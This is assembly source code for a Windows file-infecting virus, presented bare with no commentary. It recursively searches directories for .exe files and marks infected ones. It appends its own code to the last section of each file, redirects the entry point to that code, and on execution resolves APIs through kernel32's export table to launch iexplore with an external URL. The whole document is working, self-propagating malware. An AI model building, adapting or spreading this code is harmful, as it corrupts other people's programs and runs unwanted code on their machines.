	.386
    .model flat,stdcall
    option casemap:none

include     windows.inc
include     kernel32.inc
include		user32.inc

includelib		user32.lib
includelib		kernel32.lib

CTXT macro Text:VARARG
	local szText
.const
	szText	db	Text,0
.code
	exitm <offset szText>
endm

reverseArgs	macro	arglist:VARARG
	local	txt,count
    
	txt	TEXTEQU	<>
	count	= 0
	for	i,<arglist>
        count	= count + 1
        txt	TEXTEQU @CatStr(i,<!,>,<%txt>)
	endm
	if	count GT 0
        txt	SUBSTR  txt,1,@SizeStr(%txt)-1
	endif
	exitm txt
endm

_invoke	 macro	_Proc,args:VARARG
	local	count
	
	count	= 0
	% for i,< reverseArgs( args ) >
		count=count + 1
		push i
	endm
	call dword ptr _Proc
endm

    .code
	
START_ADDR	equ	this byte

_GetApiAddress	proc	_lpBase,_lpApi
	local @dwLen
	
		mov edi,_lpApi
		mov ecx,-1
		xor al,al
		repnz scasb
		mov ecx,edi
		sub ecx,_lpApi
		mov @dwLen,ecx
		
		mov esi,_lpBase
		add esi,[esi+3ch]
		assume esi:ptr IMAGE_NT_HEADERS
		mov esi,[esi].OptionalHeader.DataDirectory[0].VirtualAddress
		add esi,_lpBase
		assume esi:ptr IMAGE_EXPORT_DIRECTORY
		
		mov ebx,[esi].AddressOfNames
		add ebx,_lpBase
		xor edx,edx
		.while edx < [esi].NumberOfNames
			mov edi,[ebx]
			add edi,_lpBase
			push esi
			mov esi,_lpApi
			mov ecx,@dwLen
			repz cmpsb
			.if ZERO?
				pop esi
				jmp @F
			.endif
			pop esi
			add ebx,4
			inc edx
		.endw
@@:
		sub ebx,[esi].AddressOfNames
		sub ebx,_lpBase
		shr ebx,1
		add ebx,[esi].AddressOfNameOrdinals
		add ebx,_lpBase
		movzx ebx,word ptr [ebx]
		shl ebx,2
		add ebx,[esi].AddressOfFunctions
		add ebx,_lpBase
		mov ebx,[ebx]
		add ebx,_lpBase
		mov eax,ebx
_ret:
		assume esi:nothing
		ret

_GetApiAddress	endp

  szLoadLibraryA equ this byte
	db	'LoadLibraryA',0
  szGetProcAddress equ this byte
	db	'GetProcAddress',0
  szApi1 equ this byte
	db	'ShellExecuteA',0
  szLib1 equ this byte
	db	'shell32.dll',0
  szLink equ this byte
	db	'pic.wenwen.soso.com/p/20100921/20100921233913-1662807191.jpg',0
  szOpera equ this byte
	db	'open',0
  szFile equ this byte
	db	'iexplore',0

NEW_OEP equ this byte	
	
_NewOEP	proc
	local	@LPKR,@LLA,@GPA,@SO,@SF,@SL,@SL1,@SA,@SLLA,@SGPA
	
		call @F
@@:
		pop ebx
		sub ebx,@B
	
		lea eax,[ebx+szLoadLibraryA]
		mov @SLLA,eax
		lea eax,[ebx+szGetProcAddress]
		mov @SGPA,eax
		lea eax,[ebx+szLib1]
		mov @SL1,eax
		lea eax,[ebx+szApi1]
		mov @SA,eax
		lea eax,[ebx+szLink]
		mov @SL,eax
		lea eax,[ebx+szFile]
		mov @SF,eax
		lea eax,[ebx+szOpera]
		mov @SO,eax		
		
		mov eax,dword ptr [ebp+4]
		and eax,0ffff0000h
		sub eax,10000h
		mov @LPKR,eax	
		invoke	_GetApiAddress,eax,@SLLA
		mov @LLA,eax
		invoke	_GetApiAddress,@LPKR,@SGPA
	    mov @GPA,eax		
		_invoke @LLA,@SL1
		_invoke @GPA,eax,@SA
		_invoke	eax,NULL,@SO,@SF,@SL,NULL,SW_SHOW

		mov esp,ebp
		pop ebp

_NewOEP	endp	
		
END_ADDR equ this byte

    .data?
szFilePath	    db		MAX_PATH dup (?)
FileAlignment	dd		?
SectionAlignment	dd	?
LSBFA	dd	?
LSBSA	dd	?
MSBFA	dd	?
MSBSA	dd	?
wNumOfSection	dw	?
hThread	dd	?

	.const
szExtenExe		db		'.exe',0
	
    .code
	
_CheckPe	proc uses esi edi _lpSource
	local	@Return,@hFile,@lpMapFile
		
		mov @Return,0
		
		mov esi,_lpSource
		lea edi,szExtenExe
		invoke	lstrlen,_lpSource
		add esi,eax
		sub esi,4
		mov ecx,4
		repz cmpsb
		.if ZERO?
			jmp _Start
		.else
			jmp @F
		.endif
_Start:		
		invoke	CreateFile,_lpSource,GENERIC_READ,FILE_SHARE_READ or FILE_SHARE_WRITE,\
			NULL,OPEN_EXISTING,FILE_ATTRIBUTE_READONLY,NULL
		mov	@hFile,eax
		invoke	CreateFileMapping,eax,NULL,PAGE_READONLY,0,0,NULL
		invoke	MapViewOfFile,eax,FILE_MAP_READ,0,0,200h	
		mov	@lpMapFile,eax
		mov esi,eax
		
		;检查是否被感染过
		add esi,2
		.if dword ptr [esi] == '3991' || dword ptr [esi] == 'aMaM'
			jmp @F
		.endif
		
		sub esi,2
		assume esi:ptr IMAGE_DOS_HEADER
		.if	word ptr [esi] == 'ZM'
			mov @Return,1
		.else
			mov	@Return,0
		.endif
		mov esi,[esi].e_lfanew
		add esi,eax
		add esi,18h
		.if word ptr [esi] == IMAGE_NT_OPTIONAL_HDR64_MAGIC
			mov @Return,2
		.endif
		invoke	UnmapViewOfFile,@lpMapFile
		invoke	CloseHandle,@hFile
@@:
		mov eax,@Return
		ret

_CheckPe	endp

_ExpandFileSize	proc	_lpFileName,_Size
	local	@hFile,@lpMapFile
	local	@VAddr
	local	@ROffset,@RSize
	
		invoke	CreateFile,_lpFileName,GENERIC_READ or GENERIC_WRITE,FILE_SHARE_READ or FILE_SHARE_WRITE,\
					NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
		mov	@hFile,eax
		push eax
		invoke	GetFileSize,eax,NULL
		mov ebx,eax
		.if ebx & LSBFA
			and ebx,LSBFA
			sub ebx,FileAlignment
			neg ebx
		.else
			xor ebx,ebx
		.endif
		add eax,_Size
		add eax,ebx
		invoke	CreateFileMapping,@hFile,NULL,PAGE_READWRITE,0,eax,NULL
		invoke	MapViewOfFile,eax,FILE_MAP_READ or FILE_MAP_WRITE,0,0,0	
		mov	@lpMapFile,eax
		
		mov esi,eax
		assume esi:ptr IMAGE_DOS_HEADER
		add esi,[esi].e_lfanew
		assume esi:ptr IMAGE_NT_HEADERS
		mov eax,SectionAlignment
		add [esi].OptionalHeader.SizeOfImage,eax
		
		;找到最后一个节表
		add esi,sizeof IMAGE_NT_HEADERS
		assume esi:ptr IMAGE_SECTION_HEADER
		mov bx,wNumOfSection
		dec bx
		mov eax,sizeof IMAGE_SECTION_HEADER
		mul bx
		add esi,eax

		;修正V.SIZE
		mov eax,SectionAlignment
		mov ebx,[esi].Misc
		.if ebx & LSBSA
			add eax,SectionAlignment
		.endif
		and ebx,MSBSA
		add ebx,eax
		mov [esi].Misc,ebx
		;修正R.SIZE
		xor eax,eax
		mov ebx,[esi].SizeOfRawData
		.if ebx & LSBFA
			mov eax,FileAlignment
		.endif
		and ebx,MSBFA
		add ebx,eax
		;获取ROFFSET
		mov @ROffset,ebx
		mov eax,[esi].PointerToRawData
		add @ROffset,eax
		
		add ebx,FileAlignment
		mov [esi].SizeOfRawData,ebx
		;修正属性
		and [esi].Characteristics,0fdffffffh
		or [esi].Characteristics,60000000h
		
		invoke	UnmapViewOfFile,@lpMapFile
		invoke	CloseHandle,@hFile
		mov eax,@ROffset
		
		assume esi:nothing
		ret
		
_ExpandFileSize	endp

_OffsetToRVA	proc uses ebx esi edi	_lpFile,_dwOffset

		mov esi,_lpFile
		assume esi:ptr IMAGE_DOS_HEADER
		add esi,[esi].e_lfanew
		assume esi:ptr IMAGE_NT_HEADERS
		mov edi,_dwOffset
		add esi,sizeof IMAGE_NT_HEADERS
		assume esi:ptr IMAGE_SECTION_HEADER
		movzx ecx,wNumOfSection
		.while ecx > 0
			mov eax,[esi].PointerToRawData
			add eax,[esi].SizeOfRawData
			.if edi >= [esi].PointerToRawData && edi < eax
				mov eax,[esi].PointerToRawData
				sub edi,eax
				add edi,[esi].VirtualAddress
				mov eax,edi
				jmp @F
			.endif
			add esi,sizeof IMAGE_SECTION_HEADER
			dec ecx
		.endw
@@:
		assume esi:nothing
		ret
	
_OffsetToRVA	endp

_AddCode	proc	_lpFile,_Offset,_Size
	local @OldOEP

		mov edi,_lpFile
		add edi,_Offset
		lea esi,START_ADDR
		mov ecx,_Size
		cld
		rep movsb
				
		mov eax,_Offset
		invoke	_OffsetToRVA,_lpFile,eax
		lea ebx,NEW_OEP
		sub ebx,401000h
		add ebx,eax
		
		mov esi,_lpFile
		;头部添加标志
		add esi,2
		mov dword ptr [esi],'3991'
		
		sub esi,2
		assume esi:ptr IMAGE_DOS_HEADER
		add esi,[esi].e_lfanew
		assume esi:ptr IMAGE_NT_HEADERS
		push [esi].OptionalHeader.AddressOfEntryPoint
		pop @OldOEP
		mov [esi].OptionalHeader.AddressOfEntryPoint,ebx
		
		mov al,0e9h
		stosb
		
		invoke	_OffsetToRVA,_lpFile,_Offset
		add eax,_Size
		sub eax,@OldOEP
		add eax,6
		neg eax
		inc eax
		stosw 
		shr eax,16
		stosw
		
		ret
		
_AddCode	endp

_BindExe	proc	uses ebx esi edi	_lpszFilePath
	local	@hFile,@lpMapFile
	local	@ROffset

		invoke	CreateFile,_lpszFilePath,GENERIC_READ or GENERIC_WRITE,FILE_SHARE_READ or FILE_SHARE_WRITE,\
			NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
		mov	@hFile,eax
		invoke	CreateFileMapping,eax,NULL,PAGE_READWRITE,0,0,NULL
		invoke	MapViewOfFile,eax,FILE_MAP_READ or FILE_MAP_WRITE,0,0,200h	
		mov	@lpMapFile,eax
		
		mov esi,eax
		assume esi:ptr IMAGE_DOS_HEADER
		add esi,[esi].e_lfanew
		assume esi:ptr IMAGE_NT_HEADERS
		push [esi].FileHeader.NumberOfSections
		pop wNumOfSection
		mov eax,[esi].OptionalHeader.FileAlignment
		mov FileAlignment,eax			
		neg eax
		mov MSBFA,eax
		not eax
		mov LSBFA,eax
		mov eax,[esi].OptionalHeader.SectionAlignment
		mov SectionAlignment,eax
		neg eax
		mov MSBSA,eax
		not eax
		mov LSBSA,eax
		
		invoke	UnmapViewOfFile,@lpMapFile
		invoke	CloseHandle,@hFile
		
		invoke	_ExpandFileSize,_lpszFilePath,FileAlignment
		mov @ROffset,eax

		invoke	CreateFile,_lpszFilePath,GENERIC_READ or GENERIC_WRITE,FILE_SHARE_READ or FILE_SHARE_WRITE,\
			NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
		mov	@hFile,eax
		invoke	CreateFileMapping,eax,NULL,PAGE_READWRITE,0,0,NULL
		invoke	MapViewOfFile,eax,FILE_MAP_READ or FILE_MAP_WRITE,0,0,0	
		mov	@lpMapFile,eax			
		
		lea eax,END_ADDR
		lea	ebx,START_ADDR
		sub eax,ebx
		invoke	_AddCode,@lpMapFile,@ROffset,eax
		
		invoke	UnmapViewOfFile,@lpMapFile
		invoke	CloseHandle,@hFile
				
		ret
		
_BindExe	endp
	
_SearchExeFile	proc	_szPath
	local	@stWFD1:WIN32_FIND_DATA
	local	@hFind
	local	@tmpDir[MAX_PATH]:byte

		invoke	FindFirstFile,_szPath,addr @stWFD1
		mov @hFind,eax
		invoke	RtlZeroMemory,addr @tmpDir,sizeof @tmpDir
		.repeat
			.if (@stWFD1.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && \
					(@stWFD1.cFileName[0] != '.' && @stWFD1.cFileName[1] != 0) && \
					(@stWFD1.cFileName[1] != '.' && @stWFD1.cFileName[2] != 0)
				invoke	lstrcpy,addr @tmpDir,_szPath
				invoke	lstrlen,addr @tmpDir
				mov @tmpDir[eax-1],0
				invoke	lstrcat,addr @tmpDir,addr @stWFD1.cFileName
				invoke	lstrcat,addr @tmpDir,CTXT('\*')
				invoke	_SearchExeFile,addr @tmpDir
			.endif
			invoke	lstrcpy,addr @tmpDir,_szPath
			invoke	lstrlen,addr @tmpDir
			mov @tmpDir[eax-1],0
			invoke	lstrcat,addr @tmpDir,addr @stWFD1.cFileName
			invoke	_CheckPe,addr @tmpDir
			.if eax
				invoke	SetFileAttributes,addr @tmpDir,FILE_ATTRIBUTE_NORMAL
				invoke	_BindExe,addr @tmpDir
			.endif
@@:
			invoke	FindNextFile,@hFind,addr @stWFD1
		.until !eax
		invoke	FindClose,@hFind
		
		ret
		
_SearchExeFile	endp
	
start:
		invoke	GetCurrentDirectory,sizeof szFilePath,offset szFilePath
		invoke	lstrlen,offset szFilePath
		.if eax > 3
			invoke	lstrcat,offset szFilePath,CTXT('\')
		.endif
		invoke	lstrcat,offset szFilePath,CTXT('*')
		invoke	CreateThread,NULL,0,offset _SearchExeFile,offset szFilePath,0,NULL
		mov hThread,eax
		invoke	WaitForSingleObject,hThread,INFINITE
		invoke	CloseHandle,hThread
		invoke	ExitProcess,NULL

end start
